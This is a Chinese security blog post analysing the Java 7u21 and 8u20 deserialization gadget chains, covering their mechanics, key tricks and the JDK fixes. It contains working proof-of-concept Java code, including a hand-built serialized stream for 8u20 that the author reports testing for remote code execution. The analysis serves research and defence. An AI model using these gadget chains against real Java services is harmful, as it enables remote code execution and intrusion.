@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>7u21 与 8u20 | Koalrの沉思录</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.0/css/all.min.css">
+<link rel="shortcut icon" href="https://koalr.me//favicon.ico?v=1610803394914">
+<link rel="stylesheet" href="https://koalr.me//styles/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="做安全的有谁不喜欢这两串符号呢？
+
+接上一篇 CommonsCollections 的分析，我们注意到有几个利用链只依赖于 CC 本身的版本，这种利用链是很香的，在实战中也相对容易成功。那有没有一种利用链，它一个库都不依赖，只要装了 Jav..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://koalr.me/">
+        <img src="https://koalr.me//images/avatar.png?v=1610803394914" class="site-logo">
+        <h1 class="site-title">Koalrの沉思录</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      一个做安全开发的佛系少年的自留地
+    </div>
+    <div class="site-footer">
+      长路尽处自有明灯 | <a class="rss" href="https://koalr.me//atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">7u21 与 8u20</h2>
+            <div class="post-date">2020-07-09</div>
+            
+            <div class="post-content" v-pre>
+              <p>做安全的有谁不喜欢这两串符号呢？</p>
+<!-- more -->
+<p>接上一篇 CommonsCollections 的分析，我们注意到有几个利用链只依赖于 CC 本身的版本，这种利用链是很香的，在实战中也相对容易成功。那有没有一种利用链，它一个库都不依赖，只要装了 Java 就能反序列化呢？这便是两个至今仍然强力的反序列化 Gadget —— <code>7u21</code> 和 <code>8u20</code> 。他们非常罕见的只与 Java 版本有关的 Gadget，也就说在没有防护的状态下，只要 Java 版本符合这两个 Gadget 的要求并存在可以反序列化的点就可以直接 RCE，可以说是非常的 Amazing。这种利用链的挖掘难度非常大，整个利用过程环环相扣，各种小技巧令人咋舌，我读来感觉获益匪浅。今天我以一种鉴赏艺术的心情记录一下这两个利用链。<br>
+<a name="UBOoB"></a></p>
+<h2 id="7u21">7u21</h2>
+<p><a name="2l8mZ"></a></p>
+<h3 id="依赖">依赖</h3>
+<ul>
+<li>JRE.main == 6 &amp;&amp; JRE &lt;= ?? （未调研，到某个版本就修了)</li>
+<li>JRE.main == 7 &amp;&amp; JRE &lt;= 7u21<br>
+<a name="D09XQ"></a></li>
+</ul>
+<h3 id="利用链">利用链</h3>
+<pre><code class="language-java">LinkedHashSet.readObject()
+  LinkedHashSet.add()
+    ...
+      TemplatesImpl.hashCode() (X)
+  LinkedHashSet.add()
+    ...
+      Proxy(Templates).hashCode() (X)
+        AnnotationInvocationHandler.invoke() (X)
+          AnnotationInvocationHandler.hashCodeImpl() (X)
+            String.hashCode() (0)
+            AnnotationInvocationHandler.memberValueHashCode() (X)
+              TemplatesImpl.hashCode() (X)
+      Proxy(Templates).equals()
+        AnnotationInvocationHandler.invoke()
+          AnnotationInvocationHandler.equalsImpl()
+            Method.invoke()
+              ...
+                TemplatesImpl.getOutputProperties()
+                  TemplatesImpl.newTransformer()
+                    ...
+</code></pre>
+<p><a name="rGhAE"></a></p>
+<h3 id="关键点">关键点</h3>
+<p>为了方便理解，我将这个利用链拆成了两部分来看，第一部分:</p>
+<pre><code class="language-java">Templates tpl = MyGadget.createTemplate();
+Map m = new HashMap();
+Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
+constructor.setAccessible(true);
+InvocationHandler handler = (InvocationHandler) constructor.newInstance(Deprecated.class, m);
+Field i = handler.getClass().getDeclaredField(&quot;type&quot;);
+i.setAccessible(true);
+i.set(handler, Templates.class);
+
+m.put(&quot;foo&quot;, tpl);
+Templates proxy= (Templates)Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]{Templates.class}, handler);
+
+// 这里将触发 Templates 的实例化
+proxy.equals(tpl);
+</code></pre>
+<p>当调用 <code>proxy.equals(tpl)</code> 时，由于 proxy 是个动态代理，实际调用的是 InvocationHandler 中的这段代码 invoke 函数，并将调用逐级传递下去最终调用了 <code>TemplatesImpl.newTransformer</code></p>
+<pre><code class="language-java">// sun.reflect.annotation.AnnotationInvocationHandler#invoke
+public Object invoke(Object var1, Method var2, Object[] var3) {
+    String var4 = var2.getName();
+    Class[] var5 = var2.getParameterTypes();
+    if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) {
+        return this.equalsImpl(var3[0]); // 实际调用的是这个
+    } else {
+        assert var5.length == 0;
+    ....
+        
+// sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl
+private Boolean equalsImpl(Object var1) {
+    if (var1 == this) {
+        return true;
+    } else if (!this.type.isInstance(var1)) {
+        return false;
+    } else {
+        // 这里获取了 TemplateImpl 的所有无需参数的方法
+        // 其中的 TemplateTmpl.getOutputProperties() 会调用 newTransformer() 进而触发RCE
+        Method[] var2 = this.getMemberMethods(); 
+        int var3 = var2.length;
+
+        for(int var4 = 0; var4 &lt; var3; ++var4) {
+            Method var5 = var2[var4];
+            String var6 = var5.getName();
+            Object var7 = this.memberValues.get(var6);
+            Object var8 = null;
+            AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
+            if (var9 != null) {
+                var8 = var9.memberValues.get(var6);
+            } else {
+                try {
+                    var8 = var5.invoke(var1);
+                    ...
+
+                        
+// sun.reflect.annotation.AnnotationInvocationHandler#getMemberMethods
+// 获取所有的空参数的方法
+private Method[] getMemberMethods() {
+    if (this.memberMethods == null) {
+        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() {
+            public Method[] run() {
+                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
+                AccessibleObject.setAccessible(var1, true);
+                return var1;
+            }
+        });
+    }
+
+    return this.memberMethods;
+}
+</code></pre>
+<p>那么只要接下来能够触发上面的 <code>proxy.equals</code> 就可以完成整个利用链的构造了。在这里先补充一个小 trick，**f5a5a608 **和空字符串的 hashcode 都是 0：</p>
+<pre><code class="language-java">&quot;&quot;.hashcode() == &quot;f5a5a608&quot;.hashcode() == 0
+</code></pre>
+<p>接下来便是这个利用链的主角了 <code>LinkedHashSet</code> ，这个是基于 <code>HashMap</code> 封装的一个 <strong>有序</strong> Set，这个有序是个关键点之一，需要保证反序列化时 hash add 的顺序固定。在 HashMap add 时，实际调用的是这段代码:</p>
+<pre><code class="language-java">// java.util.HashMap#put
+public V put(K key, V value) {
+    if (key == null)
+        return putForNullKey(value);
+    int hash = hash(key);
+    int i = indexFor(hash, table.length);
+    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) {
+        Object k;
+        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {
+            V oldValue = e.value;
+            e.value = value;
+            e.recordAccess(this);
+            return oldValue;
+        }
+    }
+
+    modCount++;
+    addEntry(hash, key, value, i);
+    return null;
+}
+</code></pre>
+<p>注意到这里有个 <code>key.equals</code> ，如果我们能设法将这里的 key 变为 proxy，k 变为 tpl，那么就能实现上面的 <code>proxy.equals(tpl)</code> ，稍加观察就会发现 for 循环里的其实就是碰撞处理的代码，只要 hash 值一样，那么就一定会碰撞，如何制造碰撞呢？这不得不佩服前辈们的睿智</p>
+<pre><code class="language-java">Templates tpl = MyGadget.createTemplate();
+Map m = new HashMap();
+Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
+constructor.setAccessible(true);
+InvocationHandler handler = (InvocationHandler) constructor.newInstance(Deprecated.class, m);
+Field i = handler.getClass().getDeclaredField(&quot;type&quot;);
+i.setAccessible(true);
+i.set(handler, Templates.class);
+
+String zeroHashCodeStr = &quot;f5a5a608&quot;;
+m.put(zeroHashCodeStr, tpl);
+Templates proxy= (Templates)Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]{Templates.class}, handler);
+// proxy.equals(tpl);
+
+HashSet set = new LinkedHashSet();
+set.add(tpl);
+set.add(proxy);
+</code></pre>
+<p>将上面的代码稍微调整下，map 的 key 从 <code>foo</code> 改为 <code>f5a5a608</code> ，同时给 <code>LinkedHashSet</code> 加上了两个元素，这样一运行就可以触发前面的利用逻辑。我们刚说到制造 hash 一致的碰撞是关键，那这里的 tpl 和 proxy 为何会 hash 一致呢？<br>
+<br />tpl 的 hashcode 调用的就是 Object.hashcode() 是 jvm 返回的，没有什么特殊逻辑。proxy 调用 hashcode 时，调用链是这样的</p>
+<pre><code class="language-java">// sun.reflect.annotation.AnnotationInvocationHandler#invoke
+public Object invoke(Object var1, Method var2, Object[] var3) {
+    String var4 = var2.getName();
+    Class[] var5 = var2.getParameterTypes();
+    if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) {
+        return this.equalsImpl(var3[0]);
+    } else {
+        assert var5.length == 0;
+
+        if (var4.equals(&quot;toString&quot;)) {
+            return this.toStringImpl();
+        } else if (var4.equals(&quot;hashCode&quot;)) {
+            return this.hashCodeImpl();
+        ...    
+
+// sun.reflect.annotation.AnnotationInvocationHandler#hashCodeImpl
+private int hashCodeImpl() {
+    int var1 = 0;
+
+    Entry var3;
+    for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
+        var3 = (Entry)var2.next();
+    }
+
+    return var1;
+}
+</code></pre>
+<p>可以看到 <code>AnnotationInvocationHandler</code> 和 memberValues 所有的 key 和 value 有关，可以简化为:</p>
+<pre><code class="language-java">int a = 0;
+for k,v := memberValues {
+  a += (127 * k.hashcode()) ^ v.hashcode()
+}
+</code></pre>
+<p>如果想要这个结果是 tpl 的 hashcode，有个技巧就是让 <code>k.hashcode()</code>  为 0，v 是 tpl，而 <code>f5a5a608</code> 这个字符串的 hashcode 刚好为 0，这样一来，tpl 和 proxy 的 hashcode 就相同了，后面的流程就和 <code>proxy.equals</code>  一样了。<br>
+<br />最后，map 的 readObject 时会进行 add 操作，这就将整个流程连起来了，我们自上而下梳理下关键点:</p>
+<ol>
+<li>map.readObject 触发 add(put) 操作</li>
+<li>第一个元素是 tpl，hash 计算返回的的是 <code>tpl.hashcode()</code> ，由 jvm 动态计算生成</li>
+<li>第二个元素是 proxy, hash 计算时调用 invoke 函数最终会根据 <code>AnnotationInvocationHandler</code> 的内置 map 的 k，v 去计算，如果我们让 k 是 <code>f5a5a608</code> ，v 是 tpl，就可以让 <code>proxy.hashcode()</code> 的返回值和 <code>tpl.hashcode()</code> 一致</li>
+<li>map put 出现碰撞，调用 equals 函数去深度判断是否相等，最后调用了 invoke 函数，进而调用了 <code>TemplateImpl.newTransformer()</code> 完成利用</li>
+</ol>
+<p><br />整条利用链一气呵成，非常优美。<br>
+<a name="VQ62v"></a></p>
+<h3 id="修复方式">修复方式</h3>
+<p>很快 JDK 在 Ju25 中就修了这个链，修复方式为:</p>
+<pre><code class="language-java">// sun.reflect.annotation.AnnotationInvocationHandler#readObject
+private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
+    var1.defaultReadObject();
+    AnnotationType var2 = null;
+
+    try {
+        var2 = AnnotationType.getInstance(this.type);
+    } catch (IllegalArgumentException var9) {
+        throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
+    }
+</code></pre>
+<p>这里在 <code>defaultReadObject</code> 之后对 <code>this.type</code> 做了一个类型判断，如果不是 <code>AnnotationType</code> 就会直接异常退出，我们传入的 type 是 <code>Templates.class</code> ，必然会异常，导致这条链就断裂了。如此神奇的利用链却只有少数几个 Java 版本可用着实令人惋惜，难道 7u21 的光辉就此而止了吗？<br>
+<a name="0iyy7"></a></p>
+<h2 id="8u20">8u20</h2>
+<p><a name="ufgnt"></a></p>
+<h3 id="依赖-2">依赖</h3>
+<ul>
+<li>JRE.main == 6 &amp;&amp; JRE = ?? （未调研)</li>
+<li>JRE.main == 7 &amp;&amp; JRE &gt; 7u21 &amp;&amp; JRE &lt; ??  (未调研)</li>
+<li>JRE.main == 8 &amp;&amp; JRE &lt;= 8u20<br>
+<a name="yGdFQ"></a></li>
+</ul>
+<h3 id="利用链-2">利用链</h3>
+<p>核心逻辑与 7u21 几乎一致，仅多了异常处理的部分<br>
+<a name="8zwev"></a></p>
+<h3 id="关键点-2">关键点</h3>
+<p>我们观察针对 7u21 的修复，可以发现对 <code>type</code> 的判断发生在 <code>defaultReadObject</code> 之后，也就是说在判断时其实已经完成了反序列化，而这就是 8u20 这个链存在的基础，8u20 其实就是通过手动构造反序列化数据流绕过了这里的限制，关键点有两个：</p>
+<blockquote>
+<ol>
+<li>如果有办法将 7u21 的 exception catch 住，就可以避免 exception 打断反序列化流程</li>
+<li>Java 反序列化流存在 <code>TC_REFERENCE</code> 这个字段，可以直接引用一个已经存在 Object 减少流数据冗余</li>
+</ol>
+</blockquote>
+<p><a name="PtpDu"></a></p>
+<h4 id="try-exception">Try Exception</h4>
+<p>先说第一个，如果存在一个类的 readObject 类似这样，我们就可以将 <code>AnnotationInvocationHandler</code> 设法放在 try 块内，就可以避免 exception 的向上抛出 :</p>
+<pre><code class="language-java">private void readObject(ObjectInputStream input)
+    throws Exception {
+    input.defaultReadObject();
+    try {
+        input.readObject();
+    } catch (Exception e) {
+        System.out.println(&quot;input.readObject error&quot;);
+    }
+}
+</code></pre>
+<p>8u20 用的是 <code>BeanContextSupport</code> ，这个类的 readObject 实现如下:</p>
+<pre><code class="language-java">// java.beans.beancontext.BeanContextSupport#readObject
+private synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+    synchronized(BeanContext.globalHierarchyLock) {
+        ois.defaultReadObject();
+        initialize();
+        bcsPreDeserializationHook(ois);
+        if (serializable &gt; 0 &amp;&amp; this.equals(getBeanContextPeer()))
+            readChildren(ois); // 进入这里
+        deserialize(ois, bcmListeners = new ArrayList(1));
+    }
+}
+// java.beans.beancontext.BeanContextSupport#readChildren
+public final void readChildren(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+    int count = serializable; 
+
+    while (count-- &gt; 0) {
+        Object                      child = null;
+        BeanContextSupport.BCSChild bscc  = null;
+
+        try {
+            child = ois.readObject(); // 设法让 payload 在这被读取
+            bscc  = (BeanContextSupport.BCSChild)ois.readObject();
+        } catch (IOException ioe) {
+        	continue;
+        } catch (ClassNotFoundException cnfe) {
+        	continue;
+        }
+    }
+    ...
+</code></pre>
+<p>我们要做的就是按照其流程合理的设置一些字段的值使其能不报错的序列化完我们定义的 <code>AnnotationInvocationHandler</code> 即可。<br>
+<a name="oLB2d"></a></p>
+<h4 id="tc_reference">TC_REFERENCE</h4>
+<p>Java 反序列化存在引用机制，避免我们重复写入完全相同的元素，比如这里的一个数组中两个元素指向的是同一个：</p>
+<pre><code class="language-java">String t = &quot;test&quot;;
+String[] ts = new String[]{t, t};
+ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
+out.writeObject(ts);
+</code></pre>
+<p>其对应的反序列化流为：</p>
+<pre><code>// java -jar SerializationDumper-v1.1.jar -r out.bin
+STREAM_MAGIC - 0xac ed
+STREAM_VERSION - 0x00 05
+Contents
+  TC_ARRAY - 0x75
+    TC_CLASSDESC - 0x72
+    ...
+    newHandle 0x00 7e 00 01
+    Array size - 2 - 0x00 00 00 02
+    Values
+      Index 0:
+        (object)
+          TC_STRING - 0x74
+            newHandle 0x00 7e 00 02
+            Length - 4 - 0x00 04
+            Value - test - 0x74657374
+      Index 1:
+        (object)
+          TC_REFERENCE - 0x71
+            Handle - 8257538 - 0x00 7e 00 02 // 引用第一个
+</code></pre>
+<p>注意到第二个元素引用了第一个元素的 handle <code>0x00 7e 00 02</code> 而没有再重写完整写入。handle 的值是从 0x7e0001 开始递增的，且不能向后引用，只能引用当前流状态中已经分配过的 handle 值。<br>
+<a name="fQjDQ"></a></p>
+<h4 id="chain">Chain</h4>
+<p>我们将上面两条结合起来看，如果将 <code>AnnotationInvocationHandler</code> 合理的放置在 <code>BeanContextSupport</code> 中使其异常被处理掉，由于在异常出现之前反序列化实际已经完成，反序列化时已经被分配了一个有效的 handle 值可以被后续引用，那么后面就可以直接通过 <code>TC_REFERENCE</code> 来引用已经序列化好的 <code>AnnotationInvocationHandler</code> 从而可以继续走完 Jdk7u21 的利用链。<br />这个利用链难点不在原理，而在于需要手动构造反序列化流，因为这种流不是标准流，没法通过原生序列化操作直接生成。我也有注意到有大佬自行做了一个 SerialWriter，可以自己去组合流中的数据。在我看来这类工具适合在手工非常熟练之后再去用，如果对反序列化流的构成都不清楚，上来就用工具类只会无从下手，况且借助一些工具手写反序列化流真的不复杂，反而比较有趣。我这里不去展开如何一点点构造这条反序列化链，只说两个关键点:</p>
+<ol>
+<li>通过为 <code>classDescFlags</code> 增加 <code>SC_WRITE_METHOD</code> 可以在 ClassAnnotation 或 ObjectAnnotation 部分增加自定义数据，我自己写的利用链中 <code>BeanContextSupport</code> 就是找了一个比较靠前的位置写在了 HashSet 的 ClassAnnotation 里。</li>
+<li>虽然 exception 按预期会被 try 住，但内层的 readObject 实际没有正常结束，导致 <code>java.io.ObjectInputStream#skipCustomData</code> 没有被调用，结果就是流中会多一个 <code>TC_ENDBLOCKDATA</code> ，生成的时候要把这个去掉。</li>
+</ol>
+<p>我本地测试过的写法如下，测试过的环境包括: 6u_191、 8u20</p>
+<pre><code class="language-java">public class Jdk8u20 {
+    public static void main(String[] args) throws Exception {
+		// Templates tpl = (Templates)Gadgets.createTemplatesImpl(&quot;open /Applications/Calculator.app&quot;);
+        Templates tpl = MyGadget.createTemplate();
+        // get templates internal bytecode
+        Field i = tpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+        i.setAccessible(true);
+        byte[][] bytecodes = (byte[][]) i.get(tpl);
+        // ysoserial 中的 bytecodes 由两部分，为了避免第二个对偏移量的影响，直接去掉了
+        if (bytecodes.length == 2) {
+            bytecodes = new byte[][]{bytecodes[0]};
+        }
+
+        Object[] obj = new Object[]{
+            STREAM_MAGIC, STREAM_VERSION, // stream headers
+
+            // (1) LinkedHashSet
+            TC_OBJECT,
+            TC_CLASSDESC,
+            LinkedHashSet.class.getName(),
+            -2851667679971038690L,
+            (byte) SC_SERIALIZABLE,              // flags
+            (short) 0,             // field count
+            TC_ENDBLOCKDATA,
+            TC_CLASSDESC,          // super class
+            HashSet.class.getName(),
+            -5024744406713321676L,
+            (byte) 3,              // flags
+            (short) 0,             // field count
+
+            // hashset class annotations
+            // ========= start TemplatesTmpl ========
+            TC_OBJECT,
+            TC_CLASSDESC,
+            TemplatesImpl.class.getName(),
+            673094361519270707L,
+            (byte) (SC_WRITE_METHOD | SC_SERIALIZABLE),
+            (short) 5, // 这里只写入必须写入的几个 field
+            (byte) 'I', &quot;_indentNumber&quot;,
+            (byte) 'I', &quot;_transletIndex&quot;,
+            (byte) 'Z', &quot;_useServicesMechanism&quot;,
+            (byte) '[', &quot;_bytecodes&quot;, TC_STRING, &quot;[[B&quot;,
+            (byte) 'L', &quot;_name&quot;, TC_STRING, &quot;Ljava/lang/String;&quot;,
+            TC_ENDBLOCKDATA,
+            TC_NULL,
+            1, // _indentNumber
+            -1, // _transletIndex
+            true, // _useServiesMechanism
+            bytecodes,
+            TC_STRING, &quot;abc&quot;, // _name
+            TC_BLOCKDATA, (byte) 0x01, (byte) 0x00,
+            TC_ENDBLOCKDATA,
+            // ======== end TemplatesTmpl ==========
+
+            // ========= start BeanContextSupport ==========
+            TC_OBJECT,
+            TC_CLASSDESC,
+            BeanContextSupport.class.getName(),
+            -4879613978649577204L,
+            (byte) (SC_WRITE_METHOD | SC_SERIALIZABLE), // WRITE_METHOD means use custom readObject method
+            (short) 1, // field count
+            (byte) 'I', &quot;serializable&quot;,
+            TC_ENDBLOCKDATA,
+
+            // superclass : BeanContextChildSupport
+            TC_CLASSDESC,
+            BeanContextChildSupport.class.getName(),
+            6328947014421475877L,
+            (byte) (SC_WRITE_METHOD | SC_SERIALIZABLE),
+            (short) 1,
+            (byte) 'L', &quot;beanContextChildPeer&quot;, TC_STRING, &quot;Ljava/beans/beancontext/BeanContextChild;&quot;,
+            TC_ENDBLOCKDATA,
+            TC_NULL,
+
+            // superclass data: BeanContextChildSupport
+            TC_REFERENCE, baseWireHandle + 0x0e,
+            TC_ENDBLOCKDATA,
+            1, // serializable
+
+            // start AnnotationInvocationHandler
+            TC_OBJECT,
+            TC_CLASSDESC,
+            &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;,
+            6182022883658399397L,
+            (byte) (SC_SERIALIZABLE | SC_WRITE_METHOD),
+            (short) 2, // field count
+            (byte) 'L', &quot;memberValues&quot;, TC_STRING, &quot;Ljava/util/Map;&quot;,
+            (byte) 'L', &quot;type&quot;, TC_STRING, &quot;Ljava/lang/Class;&quot;,
+            TC_ENDBLOCKDATA,
+            TC_NULL,
+
+            //hashmap Data
+            TC_OBJECT,
+            TC_CLASSDESC,
+            java.util.HashMap.class.getName(),
+            362498820763181265L,
+            (byte) (SC_WRITE_METHOD | SC_SERIALIZABLE),
+            (short) 2, // ignore fields
+            (byte) 'F', &quot;loadFactor&quot;,
+            (byte) 'I', &quot;threshold&quot;,
+            TC_ENDBLOCKDATA,
+            TC_NULL,
+
+            // map values
+            (byte) 0x3f, (byte) 0x40, (byte) 0x00, (byte) 0x00, // loadFactor
+            12, // threshold
+            TC_BLOCKDATA, (byte) 0x08, 0x10, 0x01, // table.length, size
+            TC_STRING, &quot;f5a5a608&quot;, // key
+            TC_REFERENCE, baseWireHandle + 0x05, // value
+            TC_ENDBLOCKDATA,
+
+            // type value
+            TC_CLASS,
+            TC_CLASSDESC,
+            javax.xml.transform.Templates.class.getName(),
+            0L, // serialVersionUID
+            (byte) (SC_WRITE_METHOD | SC_SERIALIZABLE), // flag
+            (short) 0, // field count
+            TC_ENDBLOCKDATA,
+            TC_NULL,
+            // TC_ENDBLOCKDATA, // 这里不能加 END，因为流异常吃不掉这个字节
+
+            TC_BLOCKDATA, (byte) 0x04, 0,
+            TC_ENDBLOCKDATA,
+
+			// ========= END BeanContextSuppport ========
+            TC_ENDBLOCKDATA,
+            TC_NULL,
+
+            // end hashset class annotations
+
+
+            // hashSet blockData
+            TC_BLOCKDATA,
+            (byte) 12,
+            16,            // capacity
+            (byte) 0x3f, (byte) 0x40, (byte) 0x00, (byte) 0x00,
+            2,             // size
+
+            // template object
+            TC_REFERENCE, baseWireHandle + 0x05,
+
+            // write PROXY OBJECT desc
+            TC_OBJECT,
+            TC_PROXYCLASSDESC,
+            1, javax.xml.transform.Templates.class.getName(), // proxy interface count and its names
+            TC_ENDBLOCKDATA,
+            // proxy superclass desc
+            TC_CLASSDESC,
+            java.lang.reflect.Proxy.class.getName(),
+            -2222568056686623797L,
+            SC_SERIALIZABLE,
+            (short) 1, // field count
+            (byte) 'L', &quot;h&quot;, TC_STRING, &quot;Ljava/lang/reflect/InvocationHandler;&quot;,
+            TC_ENDBLOCKDATA,
+            TC_NULL, // no superclass
+            TC_REFERENCE, baseWireHandle + 0x12,
+            TC_ENDBLOCKDATA,
+        };
+        FileOutputStream out = new FileOutputStream(&quot;out.bin&quot;);
+        out.write(Converter.toBytes(obj));
+        out.close();
+        ObjectInputStream is = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));
+        System.out.println(is.readObject());
+    }
+}
+</code></pre>
+<p><a name="QV88C"></a></p>
+<h3 id="修复方式-2">修复方式</h3>
+<p>针对 8u20，我看到的有两种修复方式，分别是 jdk7 和 8 中的，其中 7 中增加了对 memberMethods 的验证:</p>
+<pre><code class="language-java">// jdk7_80  sun.reflect.annotation.AnnotationInvocationHandler#getMemberMethods
+private transient volatile Method[] memberMethods = null;
+private Method[] getMemberMethods() {
+    if (this.memberMethods == null) {
+        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() {
+            public Method[] run() {
+                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
+                // 这里的  var1 是 newTransformer 和 getOutputProperties
+                AnnotationInvocationHandler.this.validateAnnotationMethods(var1); // 增加了这个函数
+                AccessibleObject.setAccessible(var1, true);
+                return var1;
+            }
+        });
+    }
+
+    return this.memberMethods;
+}
+</code></pre>
+<p><code>validateAnnotationMethods</code> 内对 methods 有一堆校验，利用流程是走不通的。也就是尽管实例化过程没报错，但后续触发利用的逻辑被拦了。而8中的修复方式相对更治标一些:</p>
+<pre><code class="language-java">// jdk8_191 sun.reflect.annotation.AnnotationInvocationHandler#readObject
+private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
+    GetField var2 = var1.readFields(); // 这里没有直接 defaultReadObject 了
+    Class var3 = (Class)var2.get(&quot;type&quot;, (Object)null);
+    Map var4 = (Map)var2.get(&quot;memberValues&quot;, (Object)null);
+    AnnotationType var5 = null;
+
+    try {
+        var5 = AnnotationType.getInstance(var3);
+    } catch (IllegalArgumentException var13) {
+        throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
+    }
+    ...
+</code></pre>
+<p>使用 <code>readFields</code> 替换了之前的 <code>defaultReadObject</code> ，这样一来就没有可以引用的东西了，8u20 自然无从谈起。<br>
+<a name="4PxDU"></a></p>
+<h2 id="总结">总结</h2>
+<p>总体来看 7u21 这条链始于 Hashset，终于 TemplatesImpl，由 <code>AnnotationInvocationHandler</code> 承上启下。8u20 是对 Jdk7u21 生命的延续，利用链完全一致，但通过手动构造对象引用，绕过了 exception 的限制。值得一提的是，8u20 最终的反序列化流可以变成和 7u21 仅一字(byte)之差，如果将我写的 8u20 的实现去掉里面 <code>// TC_ENDBLOCKDATA,</code> 处的注释，那么就可以完美的变成 7u21。差之毫厘谬以千里，大概就是这种感觉。不过这也意味着，8u20 并不是 7u21 的超集，就因为这一个字节的差异，两个 Gadget 支持的环境范围是不存在交集的。类似的，我将 8u20 这个利用链也加入了我的 ysoserial 中，可以比较方便的生成使用 <a href="https://github.com/zema1/ysoserial">https://github.com/zema1/ysoserial</a><br />我们回看一下 8u20 的修复方式，8中的修复方式没有什么可以突破的了。相比下对7的修复似乎没那么绝情。如果我们有办法控制 <code>memberMethods</code> 的内容，在反序列化时就设置好，这样就不会进入函数校验的函数。可惜这一项是 <code>transient</code> 修饰的，我们手动设置的属性不会生效。我觉得有一种理想情况是，找到一个类会在 readObject 时会通过反射设置一些属性，且该属性和属性的值都是我们可控的，这样就可以通过反射来填充 <code>memberMethods</code> 从而绕过限制，估计不太能找到了。<br /><br>
+<a name="dlsEp"></a></p>
+<h2 id="参考">参考</h2>
+<ul>
+<li><a href="https://github.com/pwntester/JRE8u20_RCE_Gadget">https://github.com/pwntester/JRE8u20_RCE_Gadget</a></li>
+</ul>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://koalr.me/post/commonscollections-deserialization/">
+                  <h3 class="post-title">
+                    CommonsCollections 系列反序列化
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.min.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
